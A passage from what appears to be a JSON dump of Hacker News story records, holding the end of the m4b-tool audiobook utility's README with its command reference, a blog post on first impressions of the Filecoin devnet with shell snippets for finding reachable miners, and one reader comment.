accompanied by the reference of parameters available in every command. merge With m4b-tool you can merge a set of audio files to one single m4b audiobook file. Example: m4b-tool merge \"data/my-audio-book\" --output-file=\"data/my-audio-book.m4b\" This merges all Audio-Files in folder data/my-audio-book into my-audio-book.m4b, using the tag-title of every file for generating chapters. If there is a file data/my-audio-book/cover.jpg, it will be used as cover for the resulting m4b file. Note: If you use untagged audio files, you could provide a musicbrainz id to get the correct chapter names, see command chapter for more info. Reference For all options, see m4b-tool merge --help: Description: Merges a set of files to one single file Usage: merge [options] [--] <input> [<more-input-files>...] Arguments: input Input file or folder more-input-files Other Input files or folders Options: --logfile[=LOGFILE] file to log all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary encoded files are not deleted -f, --force force overwrite of existing files --no-cache clear cache completely before doing anything --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg - you should also consider --jobs when merge is used [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] --name[=NAME] custom name, otherwise the existing metadata will be used --sortname[=SORTNAME] custom sortname, that is used only for sorting --album[=ALBUM] custom album, otherwise the existing metadata for name will be used --sortalbum[=SORTALBUM] custom sortalbum, that is used only for sorting --artist[=ARTIST] custom artist, otherwise the existing metadata will be used --sortartist[=SORTARTIST] custom sortartist, that is used only for sorting --genre[=GENRE] custom genre, otherwise the existing metadata will be used --writer[=WRITER] custom writer, otherwise the existing metadata will be used --albumartist[=ALBUMARTIST] custom albumartist, otherwise the existing metadata will be used --year[=YEAR] custom year, otherwise the existing metadata will be used --description[=DESCRIPTION] custom short description, otherwise the existing metadata will be used --longdesc[=LONGDESC] custom long description, otherwise the existing metadata will be used --comment[=COMMENT] custom comment, otherwise the existing metadata will be used --copyright[=COPYRIGHT] custom copyright, otherwise the existing metadata will be used --encoded-by[=ENCODED-BY] custom encoded-by, otherwise the existing metadata will be used --cover[=COVER] custom cover, otherwise the existing metadata will be used --skip-cover skip extracting and embedding covers --series[=SERIES] custom series, this pseudo tag will be used to auto create sort order (e.g. Harry Potter or The Kingkiller Chronicles) --series-part[=SERIES-PART] custom series part, this pseudo tag will be used to auto create sort order (e.g. 1 or 2.5) --audio-format[=AUDIO-FORMAT] output format, that ffmpeg will use to create files [default: \"m4b\"] --audio-channels[=AUDIO-CHANNELS] audio channels, e.g. 1, 2 [default: \"\"] --audio-bitrate[=AUDIO-BITRATE] audio bitrate, e.g. 64k, 128k, ... [default: \"\"] --audio-samplerate[=AUDIO-SAMPLERATE] audio samplerate, e.g. 22050, 44100, ... [default: \"\"] --audio-codec[=AUDIO-CODEC] audio codec, e.g. libmp3lame, aac, ... [default: \"\"] --audio-profile[=AUDIO-PROFILE] audio profile, when using extra low bitrate - valid values: aac_he, aac_he_v2 [default: \"\"] --adjust-for-ipod auto adjust bitrate and sampling rate for ipod, if track is too long (may result in low audio quality) --fix-mime-type try to fix MIME-type (e.g. from video/mp4 to audio/mp4) - this is needed for some players to prevent an empty video window -o, --output-file=OUTPUT-FILE output file --include-extensions[=INCLUDE-EXTENSIONS] comma separated list of file extensions to include (others are skipped) [default: \"aac,alac,flac,m4a,m4b,mp3,oga,ogg,wav,wma,mp4\"] -m, --musicbrainz-id=MUSICBRAINZ-ID musicbrainz id so load chapters from --no-conversion skip conversion (destination file uses same encoding as source - all encoding specific options will be ignored) --batch-pattern[=BATCH-PATTERN] multiple batch patterns that can be used to merge all audio books in a directory matching the given patterns (e.g. %a/%t for author/title) - parameter --output-file must be a directory (multiple values allowed) --dry-run perform a dry run without converting all the files in batch mode (requires --batch-pattern) --jobs[=JOBS] Specifies the number of jobs (commands) to run simultaneously [default: 1] --use-filenames-as-chapters Use filenames for chapter titles instead of tag contents --no-chapter-reindexing Do not perform any reindexing for index-only chapter names (by default m4b-tool will try to detect index-only chapters like Chapter 1, Chapter 2 and reindex it with its numbers only) -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Placeholder reference for --batch-pattern If you use the --batch-pattern parameter, the following placeholders are supported title / name: %n sort_name: %N album: %m, sort_album: %M, artist: %a, sort_artist: %a, genre: %g, writer: %w, album_artist: %t, year: %y, description: %d, long_description: %d, comment: %c, copyright: %c, encoded_by: %e, series: %s, series_part: %p, split m4b-tool can be used to split a single m4b into a file per chapter or a flac encoded album into single tracks via cue sheet. Example: m4b-tool split --audio-format mp3 --audio-bitrate 96k --audio-channels 1 --audio-samplerate 22050 \"data/my-audio-book.m4b\" This splits the file data/my-audio-book.m4b into an mp3 file for each chapter, writing the files into data/my-audio-book_splitted/. Cue sheet splitting (experimental) If you would like to split a flac file containing multiple tracks, a cue sheet with the exact filename of the flac is required (my-album.flac requires my-album.cue): # my-album.cue is automatically found and used for splitting m4b-tool split --audio-format=mp3 --audio-bitrate=192k --audio-channels=2 --audio-samplerate=48000 \"data/my-album.flac\" Reference For all options, see m4b-tool split --help: Description: Splits an m4b file into parts Usage: split [options] [--] <input> Arguments: input Input file or folder Options: --logfile[=LOGFILE] file to dump all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary files are not deleted -f, --force force overwrite of existing files --no-cache do not use cached values and clear cache completely --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] --audio-format[=AUDIO-FORMAT] output format, that ffmpeg will use to create files [default: \"m4b\"] --audio-channels[=AUDIO-CHANNELS] audio channels, e.g. 1, 2 [default: \"\"] --audio-bitrate[=AUDIO-BITRATE] audio bitrate, e.g. 64k, 128k, ... [default: \"\"] --audio-samplerate[=AUDIO-SAMPLERATE] audio samplerate, e.g. 22050, 44100, ... [default: \"\"] --audio-codec[=AUDIO-CODEC] audio codec, e.g. libmp3lame, aac, ... [default: \"\"] --audio-profile[=AUDIO-PROFILE] audio profile, when using extra low bitrate - valid values (mono, stereo): aac_he, aac_he_v2 [default: \"\"] --adjust-for-ipod auto adjust bitrate and sampling rate for ipod, if track is to long (may lead to poor quality) --name[=NAME] provide a custom audiobook name, otherwise the existing metadata will be used [default: \"\"] --sortname[=SORTNAME] provide a custom audiobook name, that is used only for sorting purposes [default: \"\"] --album[=ALBUM] provide a custom audiobook album, otherwise the existing metadata for name will be used [default: \"\"] --sortalbum[=SORTALBUM] provide a custom audiobook album, that is used only for sorting purposes [default: \"\"] --artist[=ARTIST] provide a custom audiobook artist, otherwise the existing metadata will be used [default: \"\"] --sortartist[=SORTARTIST] provide a custom audiobook artist, that is used only for sorting purposes [default: \"\"] --genre[=GENRE] provide a custom audiobook genre, otherwise the existing metadata will be used [default: \"\"] --writer[=WRITER] provide a custom audiobook writer, otherwise the existing metadata will be used [default: \"\"] --albumartist[=ALBUMARTIST] provide a custom audiobook albumartist, otherwise the existing metadata will be used [default: \"\"] --year[=YEAR] provide a custom audiobook year, otherwise the existing metadata will be used [default: \"\"] --cover[=COVER] provide a custom audiobook cover, otherwise the existing metadata will be used --description[=DESCRIPTION] provide a custom audiobook short description, otherwise the existing metadata will be used --longdesc[=LONGDESC] provide a custom audiobook long description, otherwise the existing metadata will be used --comment[=COMMENT] provide a custom audiobook comment, otherwise the existing metadata will be used --copyright[=COPYRIGHT] provide a custom audiobook copyright, otherwise the existing metadata will be used --encoded-by[=ENCODED-BY] provide a custom audiobook encoded-by, otherwise the existing metadata will be used --series[=SERIES] provide a custom audiobook series, this pseudo tag will be used to auto create sort order (e.g. Harry Potter or The Kingkiller Chronicles) --series-part[=SERIES-PART] provide a custom audiobook series part, this pseudo tag will be used to auto create sort order (e.g. 1 or 2.5) --skip-cover skip extracting and embedding covers --fix-mime-type try to fix MIME-type (e.g. from video/mp4 to audio/mp4) - this is needed for some players to prevent video window -o, --output-dir[=OUTPUT-DIR] output directory [default: \"\"] -p, --filename-template[=FILENAME-TEMPLATE] filename twig-template for output file naming [default: \"{{\\\"%03d\\\"|format(track)}}-{{title|raw}}\"] --use-existing-chapters-file use an existing manually edited chapters file <audiobook-name>.chapters.txt instead of embedded chapters for splitting -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Help: Split an m4b into multiple m4b or mp3 files by chapter filename-template reference If you would like to use a custom filename template, the Twig template engine is provided. The following variables are available: {{encoder}} {{title}} {{artist}} {{genre}} {{writer}} {{album}} {{disk}} {{disks}} {{albumArtist}} {{year}} {{track}} {{tracks}} {{cover}} {{description}} {{longDescription}} {{comment}} {{copyright}} {{encodedBy}} You can also use some Twig specific template extensions to pad or reformat these values. The default template is {{\\\"%03d\\\"|format(track)}}-{{title}}, which results in filenames like 001-mychapter Slashes are interpreted as directory separators, so if you use a template {{year}}/{{artist}}/{{title}} the resulting directory and file is 2018/Joanne K. Rowling/Harry Potter 1 It is not recommended to use {{description}} or {{longdescription}} for filenames but they are also provided, if the field contains other information than intended Special chars, that are forbidden in filenames are removed automatically chapters Many m4b audiobook files do not contain valid chapters for different reasons. m4b-tool can handle two cases: Correct misplaced chapters by silence detection Add chapters from an internet source (mostly for well known titles) Misplaced chapters In some cases there is a shift between the chapter mark and the real beginning of a chapter. m4b-tool could try to correct that by detecting silences and relocating the chapter to the nearest silence: m4b-tool chapters --adjust-by-silence -o \"data/destination-with-adjusted-chapters.m4b\" \"data/source-with-misplaced-chapters.m4b\" It won't work, if the shift is to large or if the chapters are strongly misplaced, but since everything is done automatically, it's worth a try, isn't it? Too long chapters Sometimes you have a file that contains valid chapters, but they are too long, so you would like to split them into sub-chapters. This is tricky, because the chapters command relays only on metadata and not on track length - so it won't work. BUT: There might be a workaround. In the latest pre-release since July 2020 you can do the following: Put the source file into an empty directory, e.g. input/my-file.m4b (this is important, don't skip this step!) Run m4b-tool merge -v --no-conversion --max-chapter-length=300,900 \"input/\" -o \"output/my-rechaptered-file.m4b\" Because of --no-conversion the chaptering process is lossless, but it takes the existing chapters as input and recalculates it based on the --max-chapter-length parameter and a new silence detection. No chapters at all If you have a well known audiobook, like Harry Potter and the Philosophers Stone, you might be lucky that it is on musicbrainz. In this case m4b-tool can try to correct the chapter information using silence detection and the musicbrainz data. Since this is not a trivial task and prone to error, m4b-tool offers some parameters to correct misplaced chapter positions manually. A typical workflow Getting the musicbrainz id You have to find the exact musicbrainz id: An easy way to find the book is to use the authors name or the readers name to search for it Once you found the book of interest, click on the list entry to show further information To get the musicbrainz id, open the details page and find the MBID (e.g. 8669da33-bf9c-47fe-adc9-23798a37b096) Example: https://musicbrainz.org/work/8669da33-bf9c-47fe-adc9-23798a37b096 MBID: 8669da33-bf9c-47fe-adc9-23798a37b096 Finding main chapters After getting the MBID you should find the main chapter points (where the name of the current chapter name is read aloud by the author). m4b-tool chapters --merge-similar --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" Explanation: --merge-similar: merges all similar chapters (e.g. The Boy Who Lived, Part 1 and The Boy Who Lived, Part 2 will be merged to The Boy Who Lived) --first-chapter-offset: creates an start offset chapter called Offset First Chapter with a length of 4 seconds for skipping intros (e.g. audible, etc.) --last-chapter-offset: creates an end offset chapter called Offset Last Chapter with a length of 3,5 seconds for skipping outros (e.g. audible, etc.) -m: MBID Finding misplaced main chapters Now listen to the audiobook an go through the chapters. Lets assume, all but 2 chapters were detected correctly. The two misplaced chapters are chapter number 6 and 9. To find the real position of chapters 6 and 9 invoke: m4b-tool chapter --find-misplaced-chapters 5,8 --merge-similar --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" Explanation: --find-misplaced-chapters: Comma separated list of chapter numbers, that were not detected correctly. Now m4b-tool will generate a potential chapter for every silence around the used chapter mark to find the right chapter position. Listen to the audiobook again and find the right chapter position. Note them down. Manually adjust misplaced chapters Next run the full chapter detection with the --no-chapter-import option, which prevents writing the chapters directly to the file. m4b-tool chapter --no-chapter-import --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" To Adjust misplaced chapters, do the following: Change the start position of all misplaced chapters manually in the file ../data/harry-potter-1.chapters.txt Import the corrected chapters with mp4chaps -i ../data/harry-potter-1.m4b Listen to harry-potter-1.m4b again, now the chapters should be at the correct position. Troubleshooting If none of the chapters are detected correctly, this can have different reasons: The silence parts of this audiobook are too short for detection. To adjust the minimum silence length, use --silence-min-length 1000 setting the silence length to 1 second. Caution: To low values can lead to misplaced chapters and increased detection time. You provided the wrong MBID There is too much background noise in this specific audiobook, so that silences cannot be detected Reference For all options, see m4b-tool chapters --help: Description: Adds chapters to m4b file Usage: chapters [options] [--] <input> Arguments: input Input file or folder Options: --logfile[=LOGFILE] file to dump all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary files are not deleted -f, --force force overwrite of existing files --no-cache do not use cached values and clear cache completely --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] -m, --musicbrainz-id=MUSICBRAINZ-ID musicbrainz id so load chapters from -s, --merge-similar merge similar chapter names -o, --output-file[=OUTPUT-FILE] write chapters to this output file [default: \"\"] --adjust-by-silence will try to adjust chapters of a file by silence detection and existing chapter marks --find-misplaced-chapters[=FIND-MISPLACED-CHAPTERS] mark silence around chapter numbers that where not detected correctly, e.g. 8,15,18 [default: \"\"] --find-misplaced-offset[=FIND-MISPLACED-OFFSET] mark silence around chapter numbers with this offset seconds maximum [default: 120] --find-misplaced-tolerance[=FIND-MISPLACED-TOLERANCE] mark another chapter with this offset before each silence to compensate ffmpeg mismatches [default: -4000] --no-chapter-numbering do not append chapter number after name, e.g. My Chapter (1) --no-chapter-import do not import chapters into m4b-file, just create chapters.txt --chapter-pattern[=CHAPTER-PATTERN] regular expression for matching chapter name [default: \"/^[^:]+[1-9][0-9]*:[\\s]*(.*),.*[1-9][0-9]*[\\s]*$/i\"] --chapter-replacement[=CHAPTER-REPLACEMENT] regular expression replacement for matching chapter name [default: \"$1\"] --chapter-remove-chars[=CHAPTER-REMOVE-CHARS] remove these chars from chapter name [default: \"\"] --first-chapter-offset[=FIRST-CHAPTER-OFFSET] milliseconds to add after silence on chapter start [default: 0] --last-chapter-offset[=LAST-CHAPTER-OFFSET] milliseconds to add after silence on chapter start [default: 0] -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Help: Can add Chapters to m4b files via different types of inputs Latest release m4b-tool is a one-man-project, so sometimes it evolves quickly and often nothing happens. If you have reported an issue and it is marked as fixed, there might be no stable release for a long time. That's why now there is a latest tag in combination with a Pre-Release for testing purposes. These releases always contain the most recent builds with all available fixes and new features. Mostly untested, there may be new bugs, non-functional features or - pretty unlikely - critical issues with the risk of data loss. Feedback is always welcome, but don't expect that these are fixed quickly. To get the Pre-Release, go to https://github.com/sandreas/m4b-tool/releases/tag/latest and download the m4b-tool.tar.gz or if using docker rebuild the image with: docker build . --build-arg M4B_TOOL_DOWNLOAD_LINK=<link-to-pre-release> -t m4b-tool Building from source m4b-tool contains a build script, which will create an executable m4b-tool.phar in the dist folder. Composer for PHP is required, so after installing composer, run following commands in project root folder: Linux / Unix Install Dependencies (Ubuntu) sudo apt install ffmpeg mp4v2-utils fdkaac php-cli composer phpunit php-mbstring Build macOS Install Dependencies (brew) brew update brew install php@7.4 phpunit brew link php@7.4 Build Windows Request for help - especially german users Right now, I'm experimenting with speech recognition and speech to text using this project This is for a feature to automatically add chapter names by speech recognition. I'm not sure this will be ever working as expected, but right now I'm pretty confident, it is possible to do the following, if there are enough speech samples in a specific language: Extract chapter names and first sentences of a chapter from an ebook Detect all silences in the audiobook Perform a speech to text for the first 30 seconds after the silence Compare it with the text parts of the ebook, mark the chapter positions and add real chapters names To do that and improve the german speech recognition, I would really appreciate YOUR help on: https://voice.mozilla.org/de (german) No account is needed to help You can support mozilla DeepSpeech to better support german speech recognition by just verifying sentences after listening or, even more important, reading out loud and uploading sentences. I try to add a few ones every day, its really easy and quite fun. At the moment the german speech recognition is not good enough for the algorithm, but I will check out every now and then - as soon the recognition is working good enough, I'll go on with this feature. ",
        "_version_": 1718527403698946048
      },
      {
        "story_id": [19190425],
        "story_author": ["imrehg"],
        "story_descendants": [10],
        "story_score": [71],
        "story_time": ["2019-02-18T13:22:52Z"],
        "story_title": "First impressions of Filecoin",
        "search": [
          "First impressions of Filecoin",
          "https://gergely.imreh.net/blog/2019/02/first-impressions-of-filecoin/",
          "Im an interested user of many novel technologies, some examples being cryptocurrencies and IPFS. One technology that I was keeping an eye on was at the intersection of that two: Filecoin (its using blockchain and built on IPFS by the people who made IPFS). It aims to be a decentralized storage network, where nodes are rewarded by storing users data, in a programmatic and secure way. After a long wait, the Filecoin repositories just opened up a few days ago (see also the relevant Hacker News discussion). This allowed everyone to give the newly deployed development chain (devnet) a spin, and try out one possible future-of-storage. Since the release, Ive spent a decent handful of hours with Filecoin, and thus gathered a few first impressions. These are very early stages for the technology, so take all my comments with that nurturing point of view. Im glad they release stuff at their version 0.0.2 as it happened, even if a lot of things are in flux. Also, Ive spent a bunch of time with IPFS, a lot of parts of the experience with Filecoin (or rather with the initial implementation of go-filecoin is not as surprising (more familar) to me than likely to someone for the first time a project made by this team. More on this later. Now, in hopefully somewhat logical order... Getting started The first thing is obviously getting and installing the binaries for the project. The initial implementation is go-filecoin, which is not totally surprising, one of the two main IPFS implementations is also go-ipfs (the other, for the curious, is js-ipfs, but filecoin does not have a Javascript implementation just yet). As there are no binary releases for go-filecoin just yet, well need to install from source. The project relies on pretty recent Go (1.11.1 or 1.11.2, its not clear from the docs and the code), as well as pretty recent Rust (1.31.0, which is about 2 months old). If the combination of the two is surprising, its because some of the heavy lifting libraries was implemented in Rust, for performance reasons (that I think used in the proving that a node actually stores the data that it said it did, without sending the whole data for inspection aka, the secret sauce of Filecoin). On my ArchLinux machine, these (or newer) versions are already a default, so it was easy to get them, while on another Ubuntu 18.04 LTS that I used, youll have to do some manual installs if youd like new enough versions. Still, its doable. To facilitate installation on my system, Ive also made an ArchLinux package for go-filecoin-git. Its not super great quality, but keeping with the upstream projects release early approach its better than not having one One surprising aspect for a new user is that the initial compilation can take hours. Emphasis added, it makes a lot of things a lot more difficult. The source of this long time to compile is the parameter calculation in the rust libraries for the secret sauce, and fortunately the team noted that not everyone would expect the compilation to just run on full CPU for ~1.5 hours as it did on my laptop. Fortunately, if built locally, Rust is using caching, and on subsequent builds it can be a lot faster, but the first is a pain. Also, this makes environments where theres no caching available (such as building in Docker containers) a bit of a headache, and indeed good that there are precomputed parts available (so that clients can use those instead costly local computation, trading off for large network downloads) but those parts are not for the whole process, as much as I can tell, some is still time-consuming. Also memory consuming, as I run into my ArchLinux package not building in my CircleCI test environment, apparently by going above the allowed memory consumption and being killed (that was fun to debug, and I havent solved it yet) One note on the tools, is while the project is using Go, they are not using the regular go get methodology, but have their own gx package management tool which operates on IPFS. Talk about dogfooding! In the end, however, I had my binaries running, and could turn to their Getting Started Guide, and starting to sync some Filecoin blocks (both on ArchLinux and Ubuntu). Feels good. :) Early participation in the filecoin devnet Also get some FIL (the actual coin) from the faucet, and off to the races (Can request funds from the faucet once every 24 hours). Concepts The next step was giving a spin to the rest of the getting started, such as storing some files, and mining some coins. Here I did run into some conceptual difficulties, compared to other coins encountered previously which is quite expected, since this is a really functional tool, not just a value storage & transmission network. One of the first conceptual difficulty is that managing filecoin workflows seems to be quite a bit more manual compared to what Ive expected. What Ive expected (with no particular basis for this expectation, to be fair), is that as a miner I set up a node with spare storage space, and I see the coins coming inas a person who has files to store, I just say store these files, and be done with it if I have enough funds How it really works: as a miner, unless I put in a price for my storage, nothing will happen. That price is valid for a certain amount of time (a number of blocks), and I can put in another price alongside, but dont seem to be able to revoke a price. Yeah, I can see how this could be done automatically in the future, but still have some awkward aspects, more on this lateras a storage user, I have to specifically choose a miner to store my data. This is one feels a lot more difficult to handle, as it has proven a pain to find where can I store stuff, and have to manage the lifecycle of that storage (e.g. have to store the message ID where the miner agreed to the deal, otherwise I dont seem to be able to look up later, and thus dont seem to be able to check the feedback whether the miner is done storing the stuff they said they will) This (current) manual management really puts the network to the toy level, in my opinion. But thats not necessarily a problem, its the devnet currently anyways, and will have to have better tools later anyways. Another part of the concept that is difficult at first, that there are the filecoinnodes/daemon that one runs, which have wallet addresses, while a miners are running inside those nodes, have similar-looking addresses than the nodes wallets, but the appear to be able to point at other nodes as beneficiary. That so far makes sense (a master node which collects the payments for the workers, and a bunch of workers that provide the storage for master). My sloght confusion is in part that there are multiple formats of addresses (the wallet and peers formats), and at different stages have to address the miner, and sometimes the node it runs inside in (so theres a lot of conversion between addresses and IDs of different kinds), and also its not clear if that concept is really such (master + multiple workers), as I havent managed to set one thing up like that just yet (due to some things taking a lot of time, and spent more time on testing the straightforward stuff). When setting up a miner, one also has to provide a collateral for the storage. I would guess that would be the price one loses if the storage goes unavailable during a contract? But its not totally clear yet (will have to dig more into the docs). Whats difficult from this is that how would one in normal circumstances have enough coins to bootstrap (provide collateral and be able to start to mine)? On the devnet the faucet solves this, but in real use later I wonder what will be the flow? Also might be somewhat of a surprise, that it seems nodes get rewards on mining based on not the storage they have, but the amount of data they stored on behalf of clients. Combine this with the manual seeking out of miners by clients, and it currently all relies luck, whether or not someones miner was found and was utilized. Otherwise it will be just treading water. I guess this will be better with an automatic market as well, in the meantime might just set up 2 nodes that pat each other in the back store files on each other to see the effect first hand. Usability The usability issues Ive run into (that are the majority of the issues, I think) are not surprising given how early stage everything is, but still a bit of rundown might help others to avoid (or be less surprised at least) later. Given that the whole Filecoin chain is less than 3 days old now, it already takes hours to download the whole chain starting from scratch (depends on the network, but still getting about 30-60x the download speed compared to block generation speed, which is very small multiplier). I think this will get old very quickly. The current latest block, 8282, as I write this When I stopped my machine overnight, and started up the next day, it also took quite a long time till it started downloading blocks again. Seems like the daemon works the best when it is kept on for a long time and can build up a lot of p2p connections, but thats just a hunch. Then when storing and retrieving data, its a bit inconvenient how much information the I have to keep track of: the miners acceptance message to be able to check the storage status; then the miners address and the piece of datas content ID itself so I know exactly from where to retrieve it back (where have I put my data?). I guess this is again automated for later, but strange that it doesnt seem to be stored somewhere (maybe Ive missed it). The retrieval times can be quite long as well. I generally get 3-6 minutes retrieval times, which is 6-12 blocks worth of time and given that one pays buy the number of blocks the data is stored for As described above, the miners have to set their price for a given time, and storage clients contract them for a specific piece of content for a number of blocks. It feels like that as a miner one wants to set short times so can adjust the price as needed. On the other hand, storage clients can then only contract for short time, and need to continuously recontract the data. First I thought this might be super annoying, as then probably would spend a lot of time uploading data, but I think the underlying storage is IPFS, so the recontracting might actually be really cheap (as the network already stores more copies of the file at that time). Looks like the current block size of the storage is 256MB, meaning that files stored take up multiples of 256MB as stored. If I contract 2 small files to a miner, it would still use up 2x256MB at least. Some experiments Ive done certainly seem to show that, but not sure about that mechanism. Also, the nightly network seems to be using much smaller blocks, but not sure its because its the future, or because the nightly network requires that for development? Given these relative complexity of storing files and the block size effects above, it seems like Filecoin so far is aiming at medium / large files, not small ones, so for example storing a source code repo might not be nice currently. On the other hand, this feels temporary, the contents the nodes store seem to be same kinds of content IDs as IPFS uses (not surprisingly), and IPFS can slurp up directories, to be referred by a single content ID (and all files in there referenced within). I would not be surprised that sooner rather than later, one would be able use a similar import for batches of files. The data stored on the network is also just the content, and none of the metadata. Thus I need to keep track of extra info (this Content ID is an MP3 with this title, &c). This will likely require extra layer of tooling on top, though the current behaviour is just what comes from IPFS, I believe, which has some file type guessing in the interfaces but also at least have filenames if directories are stored, as mentioned above. I also has to import files into the local Filecoin client, before it can be contracted out. Thus the amount of space available on my computer determines quite a bit how much data can be stored on the network as well: everything is using at least 2x its own space (once in the filesystem, and once imported in the Filecoin node). Lot of the other usability issues also come from the command line interface (CLI) of go-filecoin, which is not yet very polished (again, not a surprise). For example most commands output formatted text, and have to add the enc=json setting to have a JSON output. Except a few commands output JSON by default Then the formatted text and the JSON output is not exactly the same fields, the two have different entries For many practical tasks, one also has to chain a bunch of the commands to get from A to B, and thus I think users of go-filecoin currently will have to be pretty good shell scripters (similarly to the go-ipfs users). As an example, to check whether a miner is reachable (so whether I should even try to contract it for storage: # Use this to get all the miner storage price offer go-filecoin client list-asks --enc=json # Pick a MINER that you like above PEER=$(go-filecoin address lookup $MINER) # Check if the peer has a path to it from us, and try to ping go-filecoin swarm findpeer $PEER && go-filecoin ping -n 1 $PEER && echo \"Contacted!\" Or scaling this up, finding all viable miners that one could connect to (though would still need price info in a practical setting): #!/bin/bash function checkminer() { local MINER=$1 local ADDR=$(go-filecoin address lookup $MINER) go-filecoin swarm findpeer $ADDR &> /dev/null && \\ go-filecoin ping -n 1 $ADDR &> /dev/null && \\ echo \"Possible viable peer: $MINER $ADDR\" } export -f checkminer go-filecoin client list-asks --enc=json | jq -r .Miner | sort | uniq | xargs -I{} -P 15 bash -c 'checkminer {}' Or just see the (very helpful) examples in the getting started guides linked above. Im not sure that these above are convincing, but start to use Filecoin, and youll find saving information into shell variables, and running scripts in no time There are also some unexplained workflows (as far as I can tell currectly), such as whether its possible to send coins from one wallet to the other directly? And if it is possible, how? I think the faucet does it, so maybe thats the code to look at, not sure if its anything special to the faucet, or just using the API. There is also the concept of payment channels (go-filecoin paych, the commands within), which are set up to handle periodic payments to miners based on their proof of storage (Proof of spacetime? Proof of replication? One of the many proofs Ive seen mentioned in the docs, sorry if not precise enough). Those are funky, as there might be a lot of coins tied up there with failed storage contracts (as for example I was trying to contract my own node to store something, and that didnt work, as it didnt find a path to itself but still put aside / tied up the coins in a channel :). I wonder how would one release coins from there? Or how to get back the collateral from the miners if one wants to decommission one? Development experience The go-filecoin repository seems to be pretty well setup, the issue templates work well, the repo seems to be pretty active, there are many ongoing issues and PRs. Seems like a lot of people are filing issues (early adopters tend to) which is great to see, and the developers replying & following up there is very promising. Some of the tooling is a bit behind, though, such as some version number issues, some deployment might be more difficult because of the gx tool used (that should require new code release to IPFS to be able to referred to as each release there is immutable, at least I guess its how it works), which makes some cycles longer. I was also checking out the Community section and used the chat on Riot.im/Matrix. That was a hit and miss had my issues with Riot (which I wouldnt go into now), but at least there were some good exchanges and quick help (and given some back too), I guess it should be all much busier during the week. Into the future If the concept of Filecoin is interesting to you, would suggest to check it out, dig into the whitepaper (which I need to review again too), go store some data, look around the network stats, watch some Filecoin related talks for background, and file some issues if you run into any problem I wonder when the mainnet release of Filecoin would be, but from the above I hope not too soon. There are plenty of things to fix, while if you dig deep enough, youll see that this project is trying to solve some really hairy problems, which is much easier to appreciate after trying out this teams proposed solutions to them. The future of distributed storage is interesting, regardless of how big extent Filecoin solves things. ",
          "Oof. Manual price setting for the storer/miner, manual storer selection for the user... Pretty large barriers to mainstream adoption. I'd think that in order for that to happen, both of these would be totally automatic. Still needs a lot of work.",
